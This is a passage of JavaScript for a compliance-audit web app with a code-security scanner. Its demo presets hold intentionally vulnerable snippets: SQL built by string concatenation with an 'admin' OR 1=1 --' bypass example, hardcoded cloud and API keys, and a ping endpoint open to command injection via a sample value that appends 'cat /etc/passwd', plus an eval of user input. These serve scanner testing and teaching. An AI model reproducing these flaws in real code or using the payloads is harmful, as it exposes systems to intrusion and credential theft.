app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;
  
  // CRITICAL FLAW: User input directly concatenated into SQL statement!
  // Attacker can pass: username = "admin' OR 1=1 --" to bypass auth!
  const sql = "SELECT id, email FROM accounts WHERE username = '" + username + "' AND pass = '" + password + "'";
  
  const results = await db.query(sql);
  res.json(results);
});`,

  secrets: `// ⚠️ VULNERABLE: Hardcoded production secrets in codebase
const AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE";
const AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
const OPENAI_API_KEY = "sk-proj-9A8b7C6d5E4f3G2h1J0k9L8m7N6p5Q4r3S2t1U0v";
const DATABASE_URL = "postgres://root:SuperSecretPassword2024!@production-cluster.internal:5432/core_db";
const JWT_SECRET = "jwt_super_secret_signing_key_9918237";`,

  eval: `// ⚠️ VULNERABLE: Command Injection & Dynamic eval
const { exec } = require('child_process');

app.get('/api/ping', (req, res) => {
  const host = req.query.host;
  
  // CRITICAL FLAW: Attacker can supply "8.8.8.8; cat /etc/passwd"
  exec("ping -c 1 " + host, (err, stdout) => {
    res.send(stdout);
  });
  
  // CRITICAL: Dynamic eval executes arbitrary attacker code
  const filter = req.query.filter;
  eval("console.log('Processed filter: ' + " + filter + ")");
});`,

  secure: `// ✅ SECURE: Parameterized queries, environment variables & bcrypt
require('dotenv').config();
const db = require('./db');
const bcrypt = require('bcrypt');

const DB_URL = process.env.DATABASE_URL;
const JWT_SECRET = process.env.JWT_SECRET;

app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;
  
  // SECURE: Parameterized prepared statement ($1) immunizes against SQL Injection
  const sql = 'SELECT id, email, password_hash FROM accounts WHERE username = $1';
  const result = await db.query(sql, [username]);
  
  if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });
  const valid = await bcrypt.compare(password, result.rows[0].password_hash);
  res.json({ authenticated: valid });
});`
};

// --- 7. Application State ---
class ComplianceApp {
  constructor() {
    this.answers = this.loadAnswers();
    this.activeFramework = 'all';
    this.activeCategory = 'all';
    this.activeStatus = 'all';
    this.searchQuery = '';
    this.currentModalControlId = null;

    this.initElements();
    this.bindEvents();
    this.render();
  }

  loadAnswers() {
    try {
      const saved = localStorage.getItem('compliance_shield_answers');
      return saved ? JSON.parse(saved) : {};
    } catch (e) {
      return {};
    }
  }

  saveAnswers() {
    try {
      localStorage.setItem('compliance_shield_answers', JSON.stringify(this.answers));
    } catch (e) {
      console.error(e);
    }
  }

  initElements() {
    this.cardsContainer = document.getElementById('frameworkCardsContainer');
    this.controlsContainer = document.getElementById('controlsContainer');
    this.gapsContainer = document.getElementById('gapsContainer');
    this.roadmapContainer = document.getElementById('roadmapContainer');
    this.overallScoreVal = document.getElementById('overallScoreVal');
    this.overallRing = document.getElementById('overallRing');
    this.passCountEl = document.getElementById('passCount');
    this.gapCountEl = document.getElementById('gapCount');
    this.pendingCountEl = document.getElementById('pendingCount');

    // Tabs
    this.tabAnsweredCount = document.getElementById('tabAnsweredCount');
    this.tabTotalCount = document.getElementById('tabTotalCount');
    this.tabGapsCount = document.getElementById('tabGapsCount');

    // Inputs
    this.appNameInput = document.getElementById('appNameInput');
    this.appUrlInput = document.getElementById('appUrlInput');
    this.samplePreset = document.getElementById('samplePreset');
    this.checklistSearch = document.getElementById('checklistSearch');
    this.categoryFilter = document.getElementById('categoryFilter');
    this.statusFilter = document.getElementById('statusFilter');

    // Modals
    this.controlModal = document.getElementById('controlModal');
    this.exportModal = document.getElementById('exportModal');
    this.policyPreview = document.getElementById('policyPreview');
    this.policyTitle = document.getElementById('policyTitle');

    // Code & Secret Scanner Elements
    this.codeEditorInput = document.getElementById('codeEditorInput');
    this.codeFileInput = document.getElementById('codeFileInput');
    this.fileDropzone = document.getElementById('fileDropzone');
    this.findingsContainer = document.getElementById('findingsContainer');
    this.tabCodeVulnCount = document.getElementById('tabCodeVulnCount');
    this.scanRiskGrade = document.getElementById('scanRiskGrade');
    this.gradeLetter = document.getElementById('gradeLetter');
    this.flawsCritical = document.getElementById('flawsCritical');
    this.flawsHigh = document.getElementById('flawsHigh');
    this.flawsSecrets = document.getElementById('flawsSecrets');
    this.flawsSql = document.getElementById('flawsSql');
    this.syncActionBar = document.getElementById('syncActionBar');
    this.codeLineCount = document.getElementById('codeLineCount');
    this.codeCharCount = document.getElementById('codeCharCount');
    this.scanTimestamp = document.getElementById('scanTimestamp');
    this.latestCodeFindings = [];
  }

  bindEvents() {
    // Nav tabs
    document.querySelectorAll('.nav-tab').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.nav-tab').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-view').forEach(v => v.classList.remove('active'));
        btn.classList.add('active');
        const viewId = `view-${btn.dataset.tab}`;
        const targetView = document.getElementById(viewId);
        if (targetView) targetView.classList.add('active');
      });
    });

    // Preset selector
    this.samplePreset.addEventListener('change', (e) => {
      const val = e.target.value;
      if (PRESETS[val]) {
        this.answers = { ...PRESETS[val] };
        this.saveAnswers();
        this.render();
        this.showToast(`Applied preset: ${e.target.options[e.target.selectedIndex].text}`);
      }
    });

    // Reset button
    document.getElementById('btnResetAll').addEventListener('click', () => {
      if (confirm('Are you sure you want to reset all compliance answers?')) {
        this.answers = {};
        this.saveAnswers();
        this.samplePreset.value = 'custom';
        this.render();
        this.showToast('All answers have been reset.');
      }
    });

    // Quick Audit Scan button
    document.getElementById('btnFastScan').addEventListener('click', () => {
      this.runAutomatedQuickScan();
    });

    // Filters and Search
    this.checklistSearch.addEventListener('input', (e) => {
      this.searchQuery = e.target.value.toLowerCase().trim();
      this.renderControlsList();
    });

    this.categoryFilter.addEventListener('change', (e) => {
      this.activeCategory = e.target.value;
      this.renderControlsList();
    });

    this.statusFilter.addEventListener('change', (e) => {
      this.activeStatus = e.target.value;
      this.renderControlsList();
    });

    // Batch buttons
    document.getElementById('btnBatchPass').addEventListener('click', () => {
      const visible = this.getFilteredControls();
      visible.forEach(c => { this.answers[c.id] = 'compliant'; });
      this.saveAnswers();
      this.render();
      this.showToast(`Marked ${visible.length} visible controls as Compliant`);
    });

    document.getElementById('btnBatchClear').addEventListener('click', () => {
      const visible = this.getFilteredControls();
      visible.forEach(c => { delete this.answers[c.id]; });
      this.saveAnswers();
      this.render();
      this.showToast(`Cleared answers for ${visible.length} visible controls`);
    });

    // Policies sidebar click
    document.querySelectorAll('.policy-item').forEach(item => {
      item.addEventListener('click', () => {
        document.querySelectorAll('.policy-item').forEach(i => i.classList.remove('active'));
        item.classList.add('active');
        this.renderPolicy(item.dataset.policy, item.innerText);
      });
    });

    document.getElementById('btnCopyPolicy').addEventListener('click', () => {
      const text = this.policyPreview.innerText;
      navigator.clipboard.writeText(text).then(() => {
        this.showToast('Policy template copied to clipboard!');
      });
    });

    // Export & Print
    document.getElementById('btnExportReport').addEventListener('click', () => {
      this.openExportModal();
    });
    document.getElementById('btnExportModalClose').addEventListener('click', () => {
      this.exportModal.classList.remove('open');
    });
    document.getElementById('btnExportModalClose2').addEventListener('click', () => {
      this.exportModal.classList.remove('open');
    });
    document.getElementById('btnPrintReport').addEventListener('click', () => {
      window.print();
    });
    document.getElementById('btnDownloadJson').addEventListener('click', () => {
      this.downloadJsonReport();
    });

    // Guide Modal Handlers
    const guideModal = document.getElementById('guideModal');
    document.getElementById('btnUserGuide')?.addEventListener('click', () => {
      guideModal?.classList.add('open');
    });
    document.getElementById('btnGuideModalClose')?.addEventListener('click', () => {
      guideModal?.classList.remove('open');
    });
    document.getElementById('btnGuideModalClose2')?.addEventListener('click', () => {
      guideModal?.classList.remove('open');
    });

    // Control modal handlers
    document.getElementById('btnModalClose').addEventListener('click', () => {
      this.controlModal.classList.remove('open');
    });
    document.getElementById('btnModalClose2').addEventListener('click', () => {
      this.controlModal.classList.remove('open');
    });
    document.getElementById('btnModalMarkCompliant').addEventListener('click', () => {
      if (this.currentModalControlId) {
        this.setControlStatus(this.currentModalControlId, 'compliant');
        this.controlModal.classList.remove('open');
      }
    });
    document.getElementById('btnModalMarkGap').addEventListener('click', () => {
      if (this.currentModalControlId) {
        this.setControlStatus(this.currentModalControlId, 'gap');
        this.controlModal.classList.remove('open');
      }
    });

    // --- Code & Secret Scanner Event Listeners ---
    if (this.codeEditorInput) {
      this.codeEditorInput.addEventListener('input', () => {
        this.updateCodeCounters();
      });
    }

    const btnClearCode = document.getElementById('btnClearCode');
    if (btnClearCode) {
      btnClearCode.addEventListener('click', () => {
        if (this.codeEditorInput) {
          this.codeEditorInput.value = '';
          this.updateCodeCounters();
          if (this.findingsContainer) {
            this.findingsContainer.innerHTML = `
              <div class="empty-findings-state">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                <p>Paste code or select a preset on the left, then click <strong>"Scan Code for Flaws"</strong> to inspect for security vulnerabilities.</p>
              </div>
            `;
          }
          if (this.tabCodeVulnCount) this.tabCodeVulnCount.innerText = '0';
          if (this.syncActionBar) this.syncActionBar.style.display = 'none';
          if (this.scanRiskGrade && this.gradeLetter) {
            this.scanRiskGrade.className = 'scan-grade-badge grade-neutral';
            this.gradeLetter.innerText = '—';
          }
        }
      });
    }

    // Presets
    document.getElementById('btnPresetSqli')?.addEventListener('click', () => this.loadCodePreset('sqli'));
    document.getElementById('btnPresetSecrets')?.addEventListener('click', () => this.loadCodePreset('secrets'));
    document.getElementById('btnPresetEval')?.addEventListener('click', () => this.loadCodePreset('eval'));
    document.getElementById('btnPresetSecure')?.addEventListener('click', () => this.loadCodePreset('secure'));

    // File Drag and Drop
    if (this.fileDropzone && this.codeFileInput) {
      this.fileDropzone.addEventListener('click', () => this.codeFileInput.click());
      this.codeFileInput.addEventListener('change', (e) => {
        if (e.target.files && e.target.files[0]) {
          this.handleFileUpload(e.target.files[0]);
        }
      });
      this.fileDropzone.addEventListener('dragover', (e) => {
        e.preventDefault();
        this.fileDropzone.style.borderColor = 'var(--cyan)';
      });
      this.fileDropzone.addEventListener('dragleave', () => {
        this.fileDropzone.style.borderColor = '';
      });
      this.fileDropzone.addEventListener('drop', (e) => {
        e.preventDefault();
        this.fileDropzone.style.borderColor = '';
        if (e.dataTransfer.files && e.dataTransfer.files[0]) {
          this.handleFileUpload(e.dataTransfer.files[0]);
        }
      });
    }

    // Run Scan
    document.getElementById('btnRunCodeScan')?.addEventListener('click', () => {
      this.runCodeSecurityScan();
    });

    // Sync with Compliance Audit
    document.getElementById('btnSyncWithAudit')?.addEventListener('click', () => {
      this.syncFindingsToCompliance();
    });
  }

  // --- Code Security Scanner Methods ---
  updateCodeCounters() {
    if (!this.codeEditorInput) return;
    const val = this.codeEditorInput.value;
    const lines = val ? val.split('\n').length : 0;
    const chars = val ? val.length : 0;
    if (this.codeLineCount) this.codeLineCount.innerText = `${lines} lines`;
    if (this.codeCharCount) this.codeCharCount.innerText = `${chars} characters`;
  }

  loadCodePreset(presetKey) {
    if (CODE_PRESETS[presetKey] && this.codeEditorInput) {
      this.codeEditorInput.value = CODE_PRESETS[presetKey];
      this.updateCodeCounters();
      this.runCodeSecurityScan();
      this.showToast(`Loaded "${presetKey}" code security test preset`);
    }
  }

  handleFileUpload(file) {
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (e) => {
      if (this.codeEditorInput) {
        this.codeEditorInput.value = e.target.result;
        this.updateCodeCounters();
        this.runCodeSecurityScan();
        this.showToast(`Uploaded and scanned: ${file.name}`);
      }
    };
    reader.readAsText(file);
  }

  runCodeSecurityScan() {
    if (!this.codeEditorInput) return;
    const rawCode = this.codeEditorInput.value;
    if (!rawCode || !rawCode.trim()) {
      this.showToast('Please paste code or select a vulnerability preset first.');
      return;
    }

    const lines = rawCode.split('\n');
    const findings = [];
    let criticalCount = 0;
    let highCount = 0;
    let secretsCount = 0;
    let sqlCount = 0;

    lines.forEach((lineText, idx) => {
      const lineNum = idx + 1;
      const trimmed = lineText.trim();
      // Skip simple single-line comment headers unless they look like secrets
      if (trimmed.startsWith('//') && !trimmed.includes('AKIA') && !trimmed.includes('sk-') && !trimmed.includes('postgres://')) {
        return;
      }

      CODE_VULN_RULES.forEach(rule => {
        if (rule.test(lineText)) {
          const already = findings.some(f => f.line === lineNum && f.ruleId === rule.id);
          if (!already) {
            findings.push({
              line: lineNum,
              ruleId: rule.id,
              category: rule.category,
              title: rule.title,
              severity: rule.severity,
              cwe: rule.cwe,
              owasp: rule.owasp,
              complianceControl: rule.complianceControl,
              exploit: rule.exploit,
              snippet: lineText.trim(),
              badCode: rule.badCode,
              goodCode: rule.goodCode
            });

            if (rule.severity === 'critical') criticalCount++;
            if (rule.severity === 'high') highCount++;
            if (rule.category === 'Secret Leak') secretsCount++;
            if (rule.category === 'Database Attacks') sqlCount++;
          }
        }
      });
    });

    this.latestCodeFindings = findings;

    // Update tab badge
    if (this.tabCodeVulnCount) {
      this.tabCodeVulnCount.innerText = findings.length;
    }

    // Update summary chips
    if (this.flawsCritical) this.flawsCritical.innerText = criticalCount;
    if (this.flawsHigh) this.flawsHigh.innerText = highCount;
    if (this.flawsSecrets) this.flawsSecrets.innerText = secretsCount;
    if (this.flawsSql) this.flawsSql.innerText = sqlCount;

    // Calculate Grade
    let grade = 'A';
    let gradeClass = 'grade-a';

    if (criticalCount > 0) {
      grade = 'F';
      gradeClass = 'grade-f';
    } else if (highCount >= 2) {
      grade = 'D';
      gradeClass = 'grade-f';
    } else if (highCount === 1) {
      grade = 'C';
      gradeClass = 'grade-c';
    } else if (findings.length > 0) {
      grade = 'B';
      gradeClass = 'grade-b';
    }

    if (this.scanRiskGrade && this.gradeLetter) {
      this.scanRiskGrade.className = `scan-grade-badge ${gradeClass}`;
      this.gradeLetter.innerText = grade;
    }

    if (this.scanTimestamp) {
      this.scanTimestamp.innerText = `Scanned at ${new Date().toLocaleTimeString()} • ${findings.length} findings`;
    }

    // Show sync bar if findings exist
    if (this.syncActionBar) {
      this.syncActionBar.style.display = findings.length > 0 ? 'flex' : 'none';
    }

    this.renderCodeFindings(findings);
  }

  renderCodeFindings(findings) {
    if (!this.findingsContainer) return;
    this.findingsContainer.innerHTML = '';

    if (findings.length === 0) {
      this.findingsContainer.innerHTML = `
        <div class="empty-findings-state" style="color: var(--green);">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color: var(--green); opacity: 1;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
          <h4 style="font-size: 1.15rem; font-weight: 700; color: #fff; margin-bottom: 6px;">Clean Security Scan!</h4>
          <p style="color: var(--text-secondary); font-size: 0.88rem;">No hardcoded secrets, SQL injection concatenations, or dangerous eval/RCE sinks detected in the provided code.</p>
        </div>
      `;
      return;
    }

    findings.forEach(f => {
      const card = document.createElement('div');
      card.className = `finding-card sev-${f.severity}`;
      card.innerHTML = `
        <div class="finding-top-row">
          <div class="finding-meta">
            <span class="finding-sev-pill ${f.severity}">${f.severity}</span>
            <span class="finding-line-badge">Line ${f.line}</span>
            <span class="finding-rule-tag">${f.ruleId} &bull; ${f.category}</span>
          </div>
          <span style="font-size: 0.72rem; color: var(--cyan); font-weight: 600;">Control ${f.complianceControl}</span>
        </div>
        <div class="finding-title">${f.title}</div>
        <div class="finding-exploit-box">
          <strong>Hacker Attack Vector:</strong> ${f.exploit}
        </div>
        <div style="font-size: 0.74rem; color: var(--text-muted); margin-bottom: 2px;">Vulnerable Code:</div>
        <div class="finding-code-preview">${this.escapeHTML(f.snippet)}</div>
        <div class="finding-fix-box">
          <div class="fix-header">
            <span>🛡️ Recommended Secure Remediation:</span>
          </div>
          <div style="font-size: 0.76rem; color: var(--text-muted);">${f.cwe} (${f.owasp})</div>
          <pre class="fix-code">${f.goodCode}</pre>
        </div>
      `;
      this.findingsContainer.appendChild(card);
    });
  }

  escapeHTML(str) {
    return str.replace(/[&<>'"]/g, 
      tag => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        "'": '&#39;',
        '"': '&quot;'
      }[tag] || tag)
    );
  }

  syncFindingsToCompliance() {
    if (!this.latestCodeFindings || this.latestCodeFindings.length === 0) return;

    let updatedControls = 0;
    this.latestCodeFindings.forEach(f => {
      if (f.complianceControl && this.answers[f.complianceControl] !== 'gap') {
        this.answers[f.complianceControl] = 'gap';
        updatedControls++;
      }
    });

    this.saveAnswers();
    this.render();
    this.showToast(`Updated ${updatedControls} compliance controls to Non-Compliant (Gap) based on code security flaws!`);
  }

  // --- Automated URL Quick Heuristic Scanner ---
  runAutomatedQuickScan() {
    const appName = this.appNameInput.value.trim() || 'My Web Application';
    const appUrl = this.appUrlInput.value.trim();

    const btn = document.getElementById('btnFastScan');
    const origHTML = btn.innerHTML;
    btn.innerHTML = `<span class="pulse-dot"></span> Auditing...`;
    btn.disabled = true;

    setTimeout(() => {
      btn.innerHTML = origHTML;
      btn.disabled = false;

      // Automatically deduce basic secure defaults
      this.answers['DATA-01'] = 'compliant'; // Modern web defaults TLS
      this.answers['OPS-02'] = 'compliant'; // Git PR reviews
      this.answers['OPS-03'] = 'compliant'; // Cloud backups

      if (appUrl.startsWith('https://')) {
        this.answers['DATA-01'] = 'compliant';
      }

      this.saveAnswers();
      this.render();
      this.showToast(`Initial automated check completed for "${appName}". Review detailed checklist below.`);
    }, 750);
  }

  // --- Calculations ---
  calculateMetrics() {
    let totalPass = 0;
    let totalGap = 0;
    let totalAnswered = 0;

    CONTROLS.forEach(c => {
      const st = this.answers[c.id];
      if (st === 'compliant') totalPass++;
      else if (st === 'gap') totalGap++;
      if (st) totalAnswered++;
    });

    const totalControls = CONTROLS.length;
    const pending = totalControls - totalAnswered;
    const overallScore = totalControls > 0 ? Math.round((totalPass / totalControls) * 100) : 0;

    // Framework scores
    const fwScores = {};
    FRAMEWORKS.forEach(fw => {
      const fwControls = CONTROLS.filter(c => c.frameworks.includes(fw.id));
      const passed = fwControls.filter(c => this.answers[c.id] === 'compliant').length;
      const gaps = fwControls.filter(c => this.answers[c.id] === 'gap').length;
      const score = fwControls.length > 0 ? Math.round((passed / fwControls.length) * 100) : 0;
      fwScores[fw.id] = { total: fwControls.length, passed, gaps, score };
    });

    return { totalPass, totalGap, pending, totalAnswered, totalControls, overallScore, fwScores };
  }

  render() {
    const metrics = this.calculateMetrics();

    // Update overall ring
    this.overallScoreVal.innerText = `${metrics.overallScore}%`;
    const circumference = 264;
    const offset = circumference - (metrics.overallScore / 100) * circumference;
    this.overallRing.style.strokeDashoffset = offset;

    // Update color of circle ring based on score
    if (metrics.overallScore >= 80) {
      this.overallRing.style.stroke = 'var(--green)';
    } else if (metrics.overallScore >= 45) {
      this.overallRing.style.stroke = 'var(--amber)';
    } else {
      this.overallRing.style.stroke = 'var(--cyan)';
    }

    // Mini stats
    this.passCountEl.innerText = metrics.totalPass;
    this.gapCountEl.innerText = metrics.totalGap;
    this.pendingCountEl.innerText = metrics.pending;

    // Tabs counters
    this.tabAnsweredCount.innerText = metrics.totalAnswered;
    this.tabTotalCount.innerText = metrics.totalControls;
    this.tabGapsCount.innerText = metrics.totalGap;

    this.renderFrameworkCards(metrics.fwScores);
    this.renderControlsList();
    this.renderGapsList();
    this.renderRoadmap();
    this.renderPolicy('ir', 'Incident Response Plan');
  }

  // --- Render Framework Overview Cards ---
  renderFrameworkCards(fwScores) {
    this.cardsContainer.innerHTML = '';

    // "All Controls" Card
    const allCard = document.createElement('div');
    allCard.className = `fw-card ${this.activeFramework === 'all' ? 'active' : ''}`;
    allCard.innerHTML = `
      <div class="fw-card-top">
        <div class="fw-icon-box">⚡</div>
        <span class="fw-score-badge ready">Unified</span>
      </div>
      <div>
        <div class="fw-name">All Frameworks</div>
        <div class="fw-desc">Comprehensive cross-mapped baseline matrix across all 6 standards.</div>
        <div class="fw-progress-track">
          <div class="fw-progress-fill" style="width: 100%"></div>
        </div>
        <div class="fw-stats-mini">
          <span>${CONTROLS.length} Total Controls</span>
          <span>Unified View</span>
        </div>
      </div>
    `;
    allCard.addEventListener('click', () => {
      this.activeFramework = 'all';
      this.render();
    });
    this.cardsContainer.appendChild(allCard);

    // Individual Frameworks
    FRAMEWORKS.forEach(fw => {
      const data = fwScores[fw.id] || { score: 0, passed: 0, total: 0 };
      const card = document.createElement('div');
      card.className = `fw-card ${this.activeFramework === fw.id ? 'active' : ''}`;

      let badgeClass = 'partial';
      if (data.score >= 80) badgeClass = 'ready';
      else if (data.score < 40) badgeClass = 'danger';

      card.innerHTML = `
        <div class="fw-card-top">
          <div class="fw-icon-box">${fw.icon}</div>
          <span class="fw-score-badge ${badgeClass}">${data.score}%</span>
        </div>
        <div>
          <div class="fw-name">${fw.name}</div>
          <div class="fw-desc">${fw.desc}</div>
          <div class="fw-progress-track">
            <div class="fw-progress-fill" style="width: ${data.score}%"></div>
          </div>
          <div class="fw-stats-mini">
            <span>${data.passed}/${data.total} Passed</span>
            <span>${data.gaps} Gaps</span>
          </div>
        </div>
      `;
      card.addEventListener('click', () => {
        this.activeFramework = fw.id;
        this.render();
      });
      this.cardsContainer.appendChild(card);
    });
  }

  // --- Filtering ---
  getFilteredControls() {
    return CONTROLS.filter(c => {
      // Framework filter
      if (this.activeFramework !== 'all' && !c.frameworks.includes(this.activeFramework)) {
        return false;
      }
      // Category filter
      if (this.activeCategory !== 'all' && c.category !== this.activeCategory) {
        return false;
      }
      // Status filter
      const st = this.answers[c.id];
      if (this.activeStatus === 'compliant' && st !== 'compliant') return false;
      if (this.activeStatus === 'gap' && st !== 'gap') return false;
      if (this.activeStatus === 'unanswered' && st !== undefined) return false;

      // Text search
      if (this.searchQuery) {
        const hay = `${c.id} ${c.title} ${c.desc} ${c.citations} ${c.category}`.toLowerCase();
        if (!hay.includes(this.searchQuery)) return false;
      }

      return true;
    });
  }

  // --- Render Checklist Controls ---
  renderControlsList() {
    const list = this.getFilteredControls();
    this.controlsContainer.innerHTML = '';

    if (list.length === 0) {
      this.controlsContainer.innerHTML = `
        <div class="glass-panel" style="padding: 40px; text-align: center; color: var(--text-secondary);">
          <p style="font-size: 1.1rem; margin-bottom: 8px;">No controls match the current filter criteria.</p>
          <span style="font-size: 0.85rem; color: var(--text-muted);">Try clearing search terms or changing category/framework filters.</span>
        </div>
      `;
      return;
    }

    list.forEach(c => {
      const card = document.createElement('div');
      const status = this.answers[c.id] || 'unanswered';
      card.className = `control-card status-${status}`;

      const fwTagsHTML = c.frameworks.map(f => `<span class="tag-fw">${f.toUpperCase()}</span>`).join('');

      card.innerHTML = `
        <div class="ctrl-main">
          <div class="ctrl-meta">
            <span class="ctrl-id-badge">${c.id}</span>
            <span class="ctrl-cat-tag">${c.category}</span>
            <div class="ctrl-fw-tags">${fwTagsHTML}</div>
          </div>
          <h3 class="ctrl-title">${c.title}</h3>
          <p class="ctrl-desc">${c.desc}</p>
          <div class="ctrl-remediation-tip">
            <strong>Standard Citations:</strong> ${c.citations}
          </div>
        </div>

        <div class="ctrl-actions">
          <div class="btn-toggle-group">
            <button class="toggle-opt ${status === 'compliant' ? 'selected-pass' : ''}" data-status="compliant">
              ✓ Compliant
            </button>
            <button class="toggle-opt ${status === 'gap' ? 'selected-gap' : ''}" data-status="gap">
              ✕ Gap
            </button>
            <button class="toggle-opt ${status === 'unanswered' ? 'selected-na' : ''}" data-status="clear">
              — Skip
            </button>
          </div>
          <button class="btn-details-link" data-id="${c.id}">View Audit Evidence Proof →</button>
        </div>
      `;

      // Toggle clicks
      const toggleBtns = card.querySelectorAll('.toggle-opt');
      toggleBtns.forEach(btn => {
        btn.addEventListener('click', () => {
          const st = btn.dataset.status;
          if (st === 'clear') {
            delete this.answers[c.id];
          } else {
            this.answers[c.id] = st;
          }
          this.saveAnswers();
          this.render();
        });
      });

      // View details
      card.querySelector('.btn-details-link').addEventListener('click', () => {
        this.openControlModal(c.id);
      });

      this.controlsContainer.appendChild(card);
    });
  }

  // --- Render Identified Gaps ---
  renderGapsList() {
    const gaps = CONTROLS.filter(c => this.answers[c.id] === 'gap');
    this.gapsContainer.innerHTML = '';

    const highGaps = gaps.filter(g => g.severity === 'high');
    const medGaps = gaps.filter(g => g.severity === 'medium');
    const lowGaps = gaps.filter(g => g.severity === 'low');

    document.getElementById('highGapCount').innerText = highGaps.length;
    document.getElementById('medGapCount').innerText = medGaps.length;
    document.getElementById('lowGapCount').innerText = lowGaps.length;

    if (gaps.length === 0) {
      this.gapsContainer.innerHTML = `
        <div class="glass-panel" style="padding: 40px; text-align: center; color: var(--green);">
          <div style="font-size: 2.2rem; margin-bottom: 8px;">🎉</div>
          <h4 style="font-size: 1.2rem; font-weight: 700; margin-bottom: 6px;">Zero Non-Compliance Gaps Flagged!</h4>
          <p style="color: var(--text-secondary); font-size: 0.88rem;">Mark controls as "Gap" in the checklist to generate remediation tasks.</p>
        </div>
      `;
      return;
    }

    gaps.forEach(g => {
      const item = document.createElement('div');
      item.className = 'gap-item-card';
      item.innerHTML = `
        <div class="gap-head">
          <div>
            <span class="ctrl-id-badge" style="margin-right: 8px;">${g.id}</span>
            <strong style="font-size: 1.05rem;">${g.title}</strong>
          </div>
          <span class="gap-risk-badge ${g.severity}">${g.severity} Priority</span>
        </div>
        <p style="font-size: 0.88rem; color: var(--text-secondary); margin-bottom: 12px;">${g.desc}</p>
        <div style="background: rgba(15, 23, 42, 0.7); padding: 12px; border-radius: var(--radius-sm); border: 1px solid var(--border-color); font-size: 0.85rem;">
          <div style="color: var(--cyan); font-weight: 700; margin-bottom: 4px;">🛠️ Remediation Recommendation:</div>
          <div style="color: #cbd5e1;">${g.remediationTip}</div>
        </div>
      `;
      this.gapsContainer.appendChild(item);
    });
  }

  // --- Render Remediation Roadmap ---
  renderRoadmap() {
    this.roadmapContainer.innerHTML = '';
    const gaps = CONTROLS.filter(c => this.answers[c.id] === 'gap');

    const stages = [
      {
        title: 'Phase 1: Foundational Controls & Security Killswitches (Week 1–2)',
        items: [
          'Enforce Multi-Factor Authentication (MFA) via SSO on 100% of admin accounts',
          'Ensure TLS 1.2+ and HSTS enabled on all web domains and API gateways',
          'Activate automated database backups with encryption at rest (KMS AES-256)',
          'Implement user data erasure queue for GDPR Article 17 compliance'
        ]
      },
      {
        title: 'Phase 2: DevSecOps, Branch Protection & Centralized Logging (Week 3–4)',
        items: [
          'Enable branch protection with mandatory PR reviews and SAST / Dependabot checks',
          'Forward all audit trails to centralized log storage with 365-day tamper retention',
          'Deploy real-time alerting for privileged account escalations to PagerDuty/Slack',
          'Execute HIPAA Business Associate Agreements (BAAs) with all sub-processors'
        ]
      },
      {
        title: 'Phase 3: Formal Attestation, Pentest & Auditor Readiness (Week 5–6)',
        items: [
          'Engage certified penetration testing firm for annual grey-box web test',
          'Complete and publish formal Incident Response Plan & Data Retention Policies',
          'Conduct and record quarterly access reviews for all production datastores',
          'Onboard audit platform (e.g. Vanta, Drata) and run auditor observation window'
        ]
      }
    ];

    stages.forEach((stage, idx) => {
      const block = document.createElement('div');
      block.className = 'stage-block';

      const stepsHTML = stage.items.map((step, sIdx) => `
        <li class="stage-step-item">
          <input type="checkbox" id="step_${idx}_${sIdx}">
          <label for="step_${idx}_${sIdx}">${step}</label>
        </li>
      `).join('');

      block.innerHTML = `
        <div class="stage-title">
          <span>0${idx + 1}</span>
          <span>${stage.title}</span>
        </div>
        <ul class="stage-steps-list">${stepsHTML}</ul>
      `;
      this.roadmapContainer.appendChild(block);
    });
  }

  // --- Render Selected Policy Template ---
  renderPolicy(policyKey, title) {
    const template = POLICY_TEMPLATES[policyKey] || '';
    const appName = this.appNameInput.value.trim() || 'My Web Application';
    const domain = this.appUrlInput.value.trim().replace(/^https?:\/\//, '') || 'app.example.com';

    const rendered = template
      .replace(/{{APP_NAME}}/g, appName)
      .replace(/{{DOMAIN}}/g, domain);

    this.policyTitle.innerText = title;
    this.policyPreview.innerText = rendered;
  }

  // --- Modal: Control Inspector ---
  openControlModal(id) {
    const c = CONTROLS.find(item => item.id === id);
    if (!c) return;
    this.currentModalControlId = id;

    document.getElementById('modalCategory').innerText = `${c.category} • ${c.severity.toUpperCase()} SEVERITY`;
    document.getElementById('modalTitle').innerText = `${c.id}: ${c.title}`;

    const body = document.getElementById('modalBody');
    body.innerHTML = `
      <div style="margin-bottom: 16px;">
        <h4 style="font-size: 0.85rem; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 4px;">Control Description</h4>
        <p>${c.desc}</p>
      </div>

      <div style="margin-bottom: 16px; background: rgba(15, 23, 42, 0.6); padding: 12px; border-radius: var(--radius-sm);">
        <h4 style="font-size: 0.85rem; color: var(--cyan); text-transform: uppercase; margin-bottom: 4px;">Auditor Evidence & Artifact Proof Required</h4>
        <p style="color: #cbd5e1;">${c.auditorProof}</p>
      </div>

      <div style="margin-bottom: 16px; background: rgba(15, 23, 42, 0.6); padding: 12px; border-radius: var(--radius-sm);">
        <h4 style="font-size: 0.85rem; color: var(--green); text-transform: uppercase; margin-bottom: 4px;">Remediation & Implementation Guidance</h4>
        <p style="color: #cbd5e1;">${c.remediationTip}</p>
      </div>

      <div>
        <h4 style="font-size: 0.85rem; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 4px;">Mapped Regulatory Citations</h4>
        <p style="font-family: var(--font-mono); font-size: 0.82rem; color: var(--cyan);">${c.citations}</p>
      </div>
    `;

    this.controlModal.classList.add('open');
  }

  setControlStatus(id, status) {
    this.answers[id] = status;
    this.saveAnswers();
    this.render();
    this.showToast(`Updated ${id} to ${status}`);
  }

  // --- Modal: Export Report ---
  openExportModal() {
